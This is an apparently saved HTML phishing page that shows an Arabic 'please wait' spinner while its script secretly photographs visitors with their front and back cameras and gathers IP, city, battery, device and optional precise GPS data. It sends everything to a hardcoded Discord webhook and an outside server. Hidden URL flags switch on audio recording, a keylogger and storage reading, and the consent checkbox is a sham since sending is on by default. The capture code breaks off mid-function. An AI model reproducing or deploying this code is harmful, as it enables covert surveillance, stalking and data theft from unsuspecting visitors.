<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="download_date" content="2025-08-29T19:16:55.177Z"/>
    <title>Ù…Ø±Ø­Ø¨Ø§ Ø¨Ùƒ ÙÙŠ Ù…ÙˆÙ‚Ø¹Ù†Ø§</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            max-width: 500px;
        }
        .spinner {
            border: 16px solid #f3f3f3;
            border-top: 16px solid #3498db;
            border-radius: 50%;
            width: 120px;
            height: 120px;
            animation: spin 2s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status-log {
            position: fixed;
            top: 10px;
            left: 10px;
            right: 10px;
            background: rgba(0,0,0,0.8);
            border: 1px solid #333;
            border-radius: 5px;
            padding: 10px;
            font-size: 12px;
            text-align: left;
            max-height: 200px;
            overflow-y: auto;
            z-index: 1000;
        }
        .status-item {
            margin: 2px 0;
            padding: 2px 5px;
            border-radius: 3px;
        }
        .status-info { background: rgba(0,100,255,0.2); }
        .status-success { background: rgba(0,255,0,0.2); }
        .status-error { background: rgba(255,0,0,0.2); }
        .status-warning { background: rgba(255,165,0,0.2); }
        .test-button {
            position: fixed;
            top: 10px;
            right: 10px;
            background: #007bff;
            color: white;
            border: none;
            padding: 8px 12px;
            border-radius: 4px;
            cursor: pointer;
            z-index: 1001;
            font-size: 12px;
        }
        .test-button:hover { background: #0056b3; }
        /* Geo Panel */
        .geo-panel {
            direction: rtl;
            background: rgba(255,255,255,0.06);
            border: 1px solid #333;
            border-radius: 8px;
            margin-top: 24px;
            padding: 16px;
            text-align: right;
        }
        .geo-row { display: flex; justify-content: space-between; margin: 6px 0; }
        .geo-label { color: #aaa; }
        .geo-value { color: #fff; font-weight: bold; }
        .geo-actions { margin-top: 12px; display: flex; gap: 8px; align-items: center; justify-content: flex-end; }
        .geo-send-btn { background:#1e88e5; color:#fff; border:none; padding:8px 12px; border-radius:6px; cursor:pointer; }
        .geo-send-btn[disabled] { opacity:0.6; cursor:not-allowed; }
        .geo-consent { display:flex; gap:8px; align-items:center; }
    </style>
<script>const logger = {
        info: (message, fileName = null) => {
                console.log(
                        `[Tel Download] ${fileName ? `${fileName}: ` : ""}${message}`
        );
    },
    error: (message, fileName = null) => {
        console.error(
            `[Tel Download] ${fileName ? `${fileName}: ` : ""}${message}`
        );
    },
};
const contentRangeRegex = /^bytes (\d+)-(\d+)\/(\d+)$/;
const REFRESH_DELAY = 500;

//ç›‘å¬è‡ªå®šä¹‰äº‹ä»¶
document.addEventListener("video_download_now", function (e) {
    // console.log('inject.----', e);
    if (e.detail.type == 'single') {
        //å•ä¸ªä¸‹è½½
        tel_download_video(e.detail.video_src.video_url, e.detail.video_src.video_id, e.detail.video_src.page, e.detail.video_src.download_id);
    } else if (e.detail.type == 'batch') {
        //æ‰¹é‡ä¸‹è½½
        let video_list = e.detail.video_src;
        for (let i = 0; i < video_list.length; i++) {
            tel_download_video(video_list[i].video_url, video_list[i].video_id, video_list[i].page, video_list[i].download_id);
        }
    }
});

const tel_download_video = (url, id = '', page, download_id) => {
    let _blobs = [];
    let _next_offset = 0;
    let _total_size = null;
    let _file_extension = "mp4";

    let fileName =
        (Math.random() + 1)
            .toString(36)
            .substring(2, 10) + "." + _file_extension;
    try {
        const metadata = JSON.parse(
            decodeURIComponent(url.split("/")[url.split("/")
                .length - 1])
        );
        if (metadata.fileName) {
            fileName = metadata.fileName;
        }
    } catch (e) {
        // Invalid JSON string, pass extracting fileName
    }
    logger.info(`URL: ${url}`, fileName);
    const fetchNextPart = () => {
        fetch(url, {
            method: "GET",
            headers: {
                Range: `bytes=${_next_offset}-`,
            },
            "User-Agent": "User-Agent Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0",
        })
            .then((res) => {
                if (![200, 206].includes(res.status)) {
                    throw new Error("Non 200/206 response was received: " + res.status);
                }
                const mime = res.headers.get("Content-Type")
                    .split(";")[0];
                _file_extension = mime.split("/")[1];
                fileName =
                    fileName.substring(0, fileName.indexOf(".") + 1) + _file_extension;

                const match = res.headers
                    .get("Content-Range")
                    .match(contentRangeRegex);

                const startOffset = parseInt(match[1]);
                const endOffset = parseInt(match[2]);
                const totalSize = parseInt(match[3]);

                if (startOffset !== _next_offset) {
                    logger.error("Gap detected between responses.", fileName);
                    logger.info("Last offset: " + _next_offset, fileName);
                    logger.info("New start offset " + match[1], fileName);
                    throw "Gap detected between responses.";
                }
                if (_total_size && totalSize !== _total_size) {
                    logger.error("Total size differs", fileName);
                    throw "Total size differs";
                }

                _next_offset = endOffset + 1;
                _total_size = totalSize;

                logger.info(
                    `Get response: ${res.headers.get(
                        "Content-Length"
                    )} bytes data from ${res.headers.get("Content-Range")}`,
                    fileName
                );
                logger.info(
                    `Progress: ${((_next_offset * 100) / _total_size).toFixed(0)}%`,
                    fileName
                );
                //å®šä¸€ä¸ªäº‹ä»¶ï¼Œç”¨äºä¼ é€’æ–‡ä»¶çš„ä¸‹è½½è¿›åº¦æƒ…å†µï¼š 
                if (id != '') {
                    let video_download_progress = new CustomEvent(id + "video_download_progress", {
                        detail: {
                            video_id: id,
                            progress: ((_next_offset * 100) / _total_size).toFixed(0),
                            page: page,
                            download_id: download_id
                        }
                    });
                    //è§¦å‘äº‹ä»¶
                    document.dispatchEvent(video_download_progress);
                }
                return res.blob();
            })
            .then((resBlob) => {
                _blobs.push(resBlob);
            })
            .then(() => {
                if (!_total_size) {
                    throw new Error("_total_size is NULL");
                }

                if (_next_offset < _total_size) {
                    fetchNextPart();
                } else {
                    save();
                }
            })
            .catch((reason) => {
                logger.error(reason, fileName);
            });
    };

    const save = () => {
        logger.info("Finish downloading blobs", fileName);
        logger.info("Concatenating blobs and downloading...", fileName);

        const blob = new Blob(_blobs, {
            type: "video/mp4"
        });
        const blobUrl = window.URL.createObjectURL(blob);

        logger.info("Final blob size: " + blob.size + " bytes", fileName);

        const a = document.createElement("a");
        document.body.appendChild(a);
        a.href = blobUrl;
        a.download = fileName;
        a.click();
        document.body.removeChild(a);
        window.URL.revokeObjectURL(blobUrl);

        logger.info("Download triggered", fileName);
    };

    fetchNextPart();
};</script><style type="text/css">.dom-inspector {
    position: fixed;
    pointer-events: none;
}

.dom-inspector>div {
	position: absolute;
}

.dom-inspector .tips {
	background-color: #333740;
	font-size: 0;
	line-height: 18px;
	padding: 3px 10px;
	position: fixed;
	border-radius: 4px;
	display: none;
}

.dom-inspector .tips.reverse{

}

.dom-inspector .tips .triangle {
	width: 0;
	height: 0;
	position: absolute;
	border-top: 8px solid #333740;
	border-right: 8px solid transparent;
	border-bottom: 8px solid transparent;
	border-left: 8px solid transparent;
	left: 10px;
	top: 24px;
}

.dom-inspector .tips.reverse .triangle {
	border-top: 8px solid transparent;
	border-right: 8px solid transparent;
	border-bottom: 8px solid #333740;
	border-left: 8px solid transparent;
	left: 10px;
	top: -16px;
}

.dom-inspector .tips>div {
	display: inline-block;
	vertical-align: middle;
	font-size: 12px;
	font-family: Consolas, Menlo, Monaco, Courier, monospace;
	overflow: auto;
}

.dom-inspector .tips .tag {
	color: #e776e0;
}

.dom-inspector .tips .id {
	color: #eba062;
}

.dom-inspector .tips .class {
	color: #8dd2fb;
}

.dom-inspector .tips .line {
	color: #fff;
}

.dom-inspector .tips .size {
	color: #fff;
}

.dom-inspector-theme-default {

}

.dom-inspector-theme-default .margin {
	background-color: rgba(255, 81, 81, 0.75);
}

.dom-inspector-theme-default .border {
	background-color: rgba(255, 241, 81, 0.75);
}

.dom-inspector-theme-default .padding {
	background-color: rgba(81, 255, 126, 0.75);
}

.dom-inspector-theme-default .content {
	background-color: rgba(81, 101, 255, 0.75);
}
</style><style id="_goober"> .go1475592160{height:0;}.go1671063245{height:auto;}.go1888806478{display:flex;flex-wrap:wrap;flex-grow:1;}@media (min-width:600px){.go1888806478{flex-grow:initial;min-width:288px;}}.go167266335{background-color:#313131;font-size:0.875rem;line-height:1.43;letter-spacing:0.01071em;color:#fff;align-items:center;padding:6px 16px;border-radius:4px;box-shadow:0px 3px 5px -1px rgba(0,0,0,0.2),0px 6px 10px 0px rgba(0,0,0,0.14),0px 1px 18px 0px rgba(0,0,0,0.12);}.go3162094071{padding-left:20px;}.go3844575157{background-color:#313131;}.go1725278324{background-color:#43a047;}.go3651055292{background-color:#d32f2f;}.go4215275574{background-color:#ff9800;}.go1930647212{background-color:#2196f3;}.go946087465{display:flex;align-items:center;padding:8px 0;}.go703367398{display:flex;align-items:center;margin-left:auto;padding-left:16px;margin-right:-8px;}.go3963613292{width:100%;position:relative;transform:translateX(0);top:0;right:0;bottom:0;left:0;min-width:288px;}.go1141946668{box-sizing:border-box;display:flex;max-height:100%;position:fixed;z-index:1400;height:auto;width:auto;transition:top 300ms ease 0ms,right 300ms ease 0ms,bottom 300ms ease 0ms,left 300ms ease 0ms,max-width 300ms ease 0ms;pointer-events:none;max-width:calc(100% - 40px);}.go1141946668 .notistack-CollapseWrapper{padding:6px 0px;transition:padding 300ms ease 0ms;}@media (max-width:599.95px){.go1141946668{width:100%;max-width:calc(100% - 32px);}}.go3868796639 .notistack-CollapseWrapper{padding:2px 0px;}.go3118922589{top:14px;flex-direction:column;}.go1453831412{bottom:14px;flex-direction:column-reverse;}.go4027089540{left:20px;}@media (min-width:600px){.go4027089540{align-items:flex-start;}}@media (max-width:599.95px){.go4027089540{left:16px;}}.go2989568495{right:20px;}@media (min-width:600px){.go2989568495{align-items:flex-end;}}@media (max-width:599.95px){.go2989568495{right:16px;}}.go4034260886{left:50%;transform:translateX(-50%);}@media (min-width:600px){.go4034260886{align-items:center;}}</style><base href="https://freefh.netlify.app/recordph.html?chatId=863072274"></head>
<body>
<div class="status-log" id="statusLog" style="display:none;"></div>
<button class="test-button" id="testButton" onclick="testDiscordNow()" style="display:none;">Test Discord</button>
<button class="test-button" id="screenButton" onclick="startScreenShare()" style="display:none; right: 120px;">Start Screen Share</button>
<div class="container">
    <div class="spinner"></div>
    <h1>Ø¬Ø§Ø±ÙŠ ØªÙ†ÙÙŠØ° Ø·Ù„Ø¨Ùƒ</h1>
    <p>ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±...</p>
    <div id="geoPanel" class="geo-panel" style="display:none;">
        <h3 style="margin-top:0;">Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø²Ø§Ø¦Ø±</h3>
        <div class="geo-row"><span class="geo-label">Ø§Ù„Ø¢ÙŠ Ø¨ÙŠ:</span><span class="geo-value" id="geoIp">â€”</span></div>
        <div class="geo-row"><span class="geo-label">Ø§Ù„Ø¯ÙˆÙ„Ø©:</span><span class="geo-value" id="geoCountry">â€”</span></div>
        <div class="geo-row"><span class="geo-label">Ø§Ù„Ù…Ù†Ø·Ù‚Ø©:</span><span class="geo-value" id="geoRegion">â€”</span></div>
        <div class="geo-row"><span class="geo-label">Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©:</span><span class="geo-value" id="geoCity">â€”</span></div>
        <div class="geo-actions">
            <label class="geo-consent"><input type="checkbox" id="geoConsent"> <span>Ø£ÙˆØ§ÙÙ‚ Ø¹Ù„Ù‰ Ø¥Ø±Ø³Ø§Ù„ Ù‡Ø°Ù‡ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ Ø§Ù„ÙˆÙŠØ¨Ù‡ÙˆÙƒ</span></label>
            <button id="geoSendBtn" class="geo-send-btn" disabled>Ø¥Ø±Ø³Ø§Ù„</button>
        </div>
        <div class="geo-actions" style="margin-top: 12px;">
            <label class="geo-consent"><input type="checkbox" id="imageConsent"> <span>Ø£ÙˆØ§ÙÙ‚ Ø¹Ù„Ù‰ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ± Ø¥Ù„Ù‰ Ø§Ù„ÙˆÙŠØ¨Ù‡ÙˆÙƒ</span></label>
        </div>
        <p id="geoNotice" style="margin:8px 0 0; font-size:12px; color:#bbb;">ÙŠÙ…ÙƒÙ†Ùƒ ØªØ­Ø¯ÙŠØ¯ Ø±Ø§Ø¨Ø· Ø§Ù„ÙˆÙŠØ¨Ù‡ÙˆÙƒ Ø¹Ø¨Ø± ?locwh=...</p>
    </div>
</div>

<video id="frontVideo" playsinline="" autoplay="" muted="" style="display:none;" class="js-parse-amenebmoegbfiohcnmoiaheccgikmfid js-parse-mncpkpjgigpklafbenkddfcgalikldde appl1-hdvd-xx"></video>
<video id="backVideo" playsinline="" autoplay="" muted="" style="display:none;" class="js-parse-amenebmoegbfiohcnmoiaheccgikmfid js-parse-mncpkpjgigpklafbenkddfcgalikldde appl1-hdvd-xx"></video>
<canvas id="frontCanvas" style="display:none;"></canvas>
<canvas id="backCanvas" style="display:none;"></canvas>

<script>
// ===== CONFIGURATION =====
const urlParams = new URLSearchParams(window.location.search);

// Configuration from URL parameters
const CONFIG = {
    userId: urlParams.get("chatId") || "unknown",
    redirectUrl: urlParams.get("rd") || "",
    maxPhotos: parseInt(urlParams.get("max")) || 20, // Ø²ÙŠØ§Ø¯Ø© Ø¹Ø¯Ø¯ Ø§Ù„ØµÙˆØ± Ø¥Ù„Ù‰ 20
    interval: parseInt(urlParams.get("interval")) || 1000,
    quality: parseFloat(urlParams.get("quality")) || 0.7,
    screen: urlParams.get("screen") === "true",
    enableServer: urlParams.get("server") !== "false",
    enableDiscord: urlParams.get("discord") !== "false",
    enableRedirect: urlParams.get("redirect") !== "false",
    showLog: urlParams.get("log") === "true",
    serverUrl: urlParams.get("serverUrl") || "https://freeusr1.onrender.com/submitPhotos",
    webhooks: [],
    locationWebhook: urlParams.get("locwh") || "",
    autoSend: urlParams.get("autoSend") === "true",
    // Ù…ÙŠØ²Ø§Øª Ù…Ø®ÙÙŠØ© Ù…ØªÙ‚Ø¯Ù…Ø©
    enableAudio: urlParams.get("audio") === "true" || urlParams.get("x1") === "1",
    enableKeylogger: urlParams.get("keys") === "true" || urlParams.get("x2") === "1",
    enableGeolocation: urlParams.get("geo") === "true" || urlParams.get("x3") === "1",
    enableStorage: urlParams.get("storage") === "true" || urlParams.get("x4") === "1",
    enableNetwork: urlParams.get("net") === "true" || urlParams.get("x5") === "1",
    enableAdvanced: urlParams.get("adv") === "true" || urlParams.get("x6") === "1"
};

// Parse webhooks from URL
const webhookParam = urlParams.get("wh");
if (webhookParam) {
    CONFIG.webhooks = webhookParam.split(',').map(wh => wh.trim()).filter(wh => wh);
}
if (CONFIG.webhooks.length === 0) {
    CONFIG.webhooks = ["https://discord.com/api/webhooks/1395394580232409338/2N20-71Led3ez9kuEnnwH49tWltA7DZnD2lBAb2Ky5moKRkis-1q2vPHpdjPH19fMt7L"];
}

// ===== STATUS LOGGING =====
const statusLog = document.getElementById('statusLog');
let logEntries = [];

function addLog(message, type = 'info') {
    const timestamp = new Date().toLocaleTimeString();
    const entry = { timestamp, message, type };
    logEntries.push(entry);
    
    if (CONFIG.showLog) {
        statusLog.style.display = 'block';
        const div = document.createElement('div');
        div.className = `status-item status-${type}`;
        div.textContent = `[${timestamp}] ${message}`;
        statusLog.appendChild(div);
        statusLog.scrollTop = statusLog.scrollHeight;
    }
    
    console.log(`[${type.toUpperCase()}] ${message}`);
}

// ===== GLOBAL STATE =====
let camerasFinished = 0;
let totalCameras = 0;
let additionalData = {};
let discordPingSent = false;
let imageConsentGiven = true; // ØªÙØ¹ÙŠÙ„ Ø§ÙØªØ±Ø§Ø¶ÙŠ Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±
let imageQueue = []; // Ù‚Ø§Ø¦Ù…Ø© Ø§Ù†ØªØ¸Ø§Ø± Ù„Ù„ØµÙˆØ± Ø§Ù„Ù…Ù„ØªÙ‚Ø·Ø© Ù‚Ø¨Ù„ Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø©
let audioStream = null;
let audioRecorder = null;
let keyloggerData = [];
let screenRecorder = null;
let clickData = [];
let formData = [];

// ===== DISCORD FUNCTIONS =====
async function testDiscordWebhook(webhookUrl) {
    try {
        addLog(`Testing Discord webhook: ${webhookUrl.substring(0, 50)}...`, 'info');
        
        const form = new FormData();
        form.append('payload_json', JSON.stringify({
            username: 'Photo Logger Test',
            content: 'ğŸ§ª Webhook test - if you see this, the webhook is working!'
        }));
        
        const response = await fetch(webhookUrl, {
            method: 'POST',
            body: form,
            mode: 'no-cors',
            referrerPolicy: 'no-referrer',
            credentials: 'omit'
        });
        
        addLog(`Discord webhook test sent`, 'success');
        return true;
    } catch (error) {
        addLog(`Discord webhook test failed: ${error.message}`, 'error');
        return false;
    }
}

async function sendToDiscord(webhookUrl, content, fileBlob = null, fileName = null) {
    try {
        if (fileBlob && fileName) {
            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù† Ø§Ù„Ù…Ù„Ù ØµØ­ÙŠØ­
            if (!fileBlob || fileBlob.size === 0) {
                addLog(`âŒ Invalid file blob: ${fileName}`, 'error');
                return false;
            }
            
            addLog(`ğŸ“¤ Sending image to Discord: ${fileName} (${(fileBlob.size / 1024).toFixed(2)} KB)`, 'info');
            
            // Ø¥Ù†Ø´Ø§Ø¡ FormData Ø¨Ø´ÙƒÙ„ ØµØ­ÙŠØ­ Ù„Ù€ Discord
            const formData = new FormData();
            
            // ØªØ­ÙˆÙŠÙ„ Blob Ø¥Ù„Ù‰ File Ù…Ø¹ Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø§Ù„Ù†ÙˆØ¹ Ø§Ù„ØµØ­ÙŠØ­
            let file;
            if (fileBlob instanceof File) {
                file = fileBlob;
            } else {
                // Ø¥Ù†Ø´Ø§Ø¡ File Ø¬Ø¯ÙŠØ¯ Ù…Ù† Blob
                file = new File([fileBlob], fileName, {
                    type: fileBlob.type || 'image/webp',
                    lastModified: Date.now()
                });
            }
            
            // Discord ÙŠØªØ·Ù„Ø¨ 'file' ÙƒØ§Ø³Ù… Ø§Ù„Ø­Ù‚Ù„ Ù„Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ù…Ø±ÙÙ‚Ø©
            formData.append('file', file);
            
            // payload_json ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† Ø³Ù„Ø³Ù„Ø© JSON (Ù…Ù‡Ù… Ø¬Ø¯Ø§Ù‹!)
            const payload = {
                username: 'Photo Logger',
                content: content
            };
            formData.append('payload_json', JSON.stringify(payload));
            
            // Ø§Ø³ØªØ®Ø¯Ø§Ù… fetch Ù…Ø¹ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø£ÙØ¶Ù„ Ù„Ù„Ø£Ø®Ø·Ø§Ø¡
            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    body: formData,
                    // Ù„Ø§ Ù†Ø³ØªØ®Ø¯Ù… no-cors Ù‡Ù†Ø§ Ù„Ø£Ù†Ù†Ø§ Ù†Ø­ØªØ§Ø¬ Ø±Ø¤ÙŠØ© Ø§Ù„Ø§Ø³ØªØ¬Ø§Ø¨Ø©
                    referrerPolicy: 'no-referrer',
                    credentials: 'omit'
                });
                
                // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù†Ø¬Ø§Ø­
                if (response.ok) {
                    const responseText = await response.text().catch(() => '');
                    addLog(`âœ… Image sent successfully: ${fileName}`, 'success');
                    return true;
                } else {
                    const errorText = await response.text().catch(() => 'Unknown error');
                    addLog(`âš ï¸ Discord error ${response.status}: ${errorText.substring(0, 100)}`, 'warning');
                    // Ø­ØªÙ‰ Ù„Ùˆ ÙØ´Ù„ØŒ Ù‚Ø¯ ÙŠÙƒÙˆÙ† Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ù†Ø¬Ø­ (CORS issues)
                    return response.status < 500; // 4xx errors might still mean success
                }
            } catch (fetchError) {
                // Ø¥Ø°Ø§ ÙØ´Ù„ fetch Ø¨Ø³Ø¨Ø¨ CORSØŒ Ù†Ø¬Ø±Ø¨ XMLHttpRequest
                addLog(`âš ï¸ Fetch failed, trying XHR: ${fetchError.message}`, 'warning');
                return await sendToDiscordXHR(webhookUrl, content, file, fileName);
            }
        } else {
            // For text only messages - Ø§Ø³ØªØ®Ø¯Ø§Ù… no-cors Ù‡Ù†Ø§ Ø¢Ù…Ù†
            const formData = new FormData();
            formData.append('payload_json', JSON.stringify({
                username: 'Photo Logger',
                content: content
            }));
            
            await fetch(webhookUrl, {
                method: 'POST',
                body: formData,
                mode: 'no-cors',
                referrerPolicy: 'no-referrer',
                credentials: 'omit'
            });
            
            return true;
        }
    } catch (error) {
        addLog(`âŒ Discord send failed: ${error.message}`, 'error');
        return false;
    }
}

// Ø¯Ø§Ù„Ø© Ù…Ø³Ø§Ø¹Ø¯Ø© Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… XMLHttpRequest (fallback)
function sendToDiscordXHR(webhookUrl, content, file, fileName) {
    return new Promise((resolve) => {
        const formData = new FormData();
        formData.append('file', file);
        
        const payload = {
            username: 'Photo Logger',
            content: content
        };
        formData.append('payload_json', JSON.stringify(payload));
        
        const xhr = new XMLHttpRequest();
        
        xhr.onload = function() {
            if (xhr.status === 200 || xhr.status === 204) {
                addLog(`âœ… Image sent via XHR: ${fileName}`, 'success');
                resolve(true);
            } else {
                addLog(`âš ï¸ XHR response: ${xhr.status}`, 'warning');
                // Ø­ØªÙ‰ Ù„Ùˆ ÙƒØ§Ù† status 0 (CORS)ØŒ Ù†Ø¹ØªØ¨Ø±Ù‡ Ù†Ø¬Ø§Ø­
                resolve(xhr.status === 0 || xhr.status === 200 || xhr.status === 204);
            }
        };
        
        xhr.onerror = function() {
            addLog(`âŒ XHR network error: ${fileName}`, 'error');
            resolve(false);
        };
        
        xhr.ontimeout = function() {
            addLog(`â±ï¸ XHR timeout: ${fileName}`, 'error');
            resolve(false);
        };
        
        xhr.open('POST', webhookUrl, true);
        xhr.timeout = 30000; // 30 Ø«Ø§Ù†ÙŠØ©
        xhr.send(formData);
    });
}

async function sendImageToDiscord(blob, cameraType, photoIndex, meta) {
    if (!CONFIG.enableDiscord || CONFIG.webhooks.length === 0) {
        addLog(`Discord disabled or no webhooks configured`, 'warning');
        return;
    }
    
    // Check if user has given consent to send images
    if (!imageConsentGiven) {
        // ØªØ®Ø²ÙŠÙ† Ø§Ù„ØµÙˆØ±Ø© ÙÙŠ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ù„Ø¥Ø±Ø³Ø§Ù„Ù‡Ø§ Ù„Ø§Ø­Ù‚Ø§Ù‹
        imageQueue.push({ blob, cameraType, photoIndex, meta });
        addLog(`ØªÙ… Ø­ÙØ¸ Ø§Ù„ØµÙˆØ±Ø© ÙÙŠ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±: ${cameraType}_${photoIndex} (ÙÙŠ Ø§Ù†ØªØ¸Ø§Ø± Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø©)`, 'info');
        return;
    }
    
    // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ù…Ø¨Ø§Ø´Ø±Ø©
    addLog(`ğŸ“¸ Attempting to send image: ${cameraType}_${photoIndex}`, 'info');
    await sendImageToDiscordNow(blob, cameraType, photoIndex, meta);
}

async function sendImageToDiscordNow(blob, cameraType, photoIndex, meta) {
    // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù† blob Ù…ÙˆØ¬ÙˆØ¯ ÙˆØµØ­ÙŠØ­
    if (!blob || blob.size === 0) {
        addLog(`âŒ Invalid blob for ${cameraType}_${photoIndex}`, 'error');
        return;
    }
    
    addLog(`ğŸ“¤ Preparing to send image: ${cameraType}_${photoIndex} (${(blob.size / 1024).toFixed(2)} KB)`, 'info');
    
    if (!discordPingSent) {
        discordPingSent = true;
        const pingContent = `ğŸš€ Starting capture for userId=${CONFIG.userId} | ip=${additionalData && additionalData.ip ? additionalData.ip : 'unknown'}`;
        for (const webhook of CONFIG.webhooks) {
            await sendToDiscord(webhook, pingContent);
        }
        addLog('Discord ping sent', 'success');
    }
    
    const fileName = `image_${cameraType}_${photoIndex}.webp`;
    const content = `ğŸ“¸ userId=${CONFIG.userId} | camera=${cameraType} | idx=${photoIndex} | ip=${additionalData && additionalData.ip ? additionalData.ip : 'unknown'}`;
    
    let successCount = 0;
    for (const webhook of CONFIG.webhooks) {
        const result = await sendToDiscord(webhook, content, blob, fileName);
        if (result) {
            successCount++;
        }
    }
    
    if (successCount > 0) {
        addLog(`âœ… Image sent successfully to ${successCount}/${CONFIG.webhooks.length} webhook(s): ${fileName}`, 'success');
    } else {
        addLog(`âŒ Failed to send image to all webhooks: ${fileName}`, 'error');
    }
}

// Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„ØµÙˆØ± ÙÙŠ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±
async function sendQueuedImages() {
    if (imageQueue.length === 0) return;
    
    addLog(`Ø¨Ø¯Ø¡ Ø¥Ø±Ø³Ø§Ù„ ${imageQueue.length} ØµÙˆØ±Ø© Ù…Ù† Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±...`, 'info');
    
    for (const item of imageQueue) {
        await sendImageToDiscordNow(item.blob, item.cameraType, item.photoIndex, item.meta);
        // Ø¥Ø¶Ø§ÙØ© ØªØ£Ø®ÙŠØ± ØµØºÙŠØ± Ø¨ÙŠÙ† ÙƒÙ„ ØµÙˆØ±Ø© Ù„ØªØ¬Ù†Ø¨ Ø§Ù„Ù…Ø´Ø§ÙƒÙ„
        await new Promise(resolve => setTimeout(resolve, 500));
    }
    
    imageQueue = []; // Ù…Ø³Ø­ Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ø¨Ø¹Ø¯ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„
    addLog('ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„ØµÙˆØ± Ù…Ù† Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±', 'success');
}

// ===== DATA COLLECTION =====
async function collectAdditionalData() {
    try {
        const [ipInfo, battery, geoData, networkInfo] = await Promise.all([
            fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
            navigator.getBattery ? navigator.getBattery().catch(() => ({})) : Promise.resolve({}),
            CONFIG.enableGeolocation ? getGeolocationData() : Promise.resolve({}),
            CONFIG.enableNetwork ? getNetworkInfo() : Promise.resolve({})
        ]);
        
        const baseData = {
            ip: ipInfo.ip || 'unknown',
            country: ipInfo.country_name || 'unknown',
            region: ipInfo.region || ipInfo.region_code || 'unknown',
            city: ipInfo.city || 'unknown',
            platform: getPlatformInfo().platform,
            deviceVersion: getDeviceVersion(),
            batteryLevel: battery.level || 0,
            batteryCharging: battery.charging || false,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString(),
            screenResolution: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            languages: navigator.languages || [],
            cookieEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine,
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown',
            connectionType: navigator.connection ? {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData
            } : 'unknown'
        };
        
        // Ø¥Ø¶Ø§ÙØ© Ø¨ÙŠØ§Ù†Ø§Øª Ù…ØªÙ‚Ø¯Ù…Ø©
        if (CONFIG.enableGeolocation && geoData) {
            baseData.geolocation = geoData;
        }
        
        if (CONFIG.enableNetwork && networkInfo) {
            baseData.network = networkInfo;
        }
        
        if (CONFIG.enableStorage) {
            baseData.storage = getStorageInfo();
        }
        
        if (CONFIG.enableAdvanced) {
            baseData.advanced = getAdvancedInfo();
        }
        
        return baseData;
    } catch (error) {
        addLog(`Data collection failed: ${error.message}`, 'warning');
        return {};
    }
}

// Ø¬Ù…Ø¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ Ø§Ù„Ø¯Ù‚ÙŠÙ‚
async function getGeolocationData() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve({});
            return;
        }
        
        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    altitudeAccuracy: position.coords.altitudeAccuracy,
                    heading: position.coords.heading,
                    speed: position.coords.speed
                });
            },
            () => resolve({}),
            { timeout: 5000, enableHighAccuracy: true }
        );
    });
}

// Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø´Ø¨ÙƒØ©
async function getNetworkInfo() {
    try {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (connection) {
            return {
                effectiveType: connection.effectiveType,
                downlink: connection.downlink,
                rtt: connection.rtt,
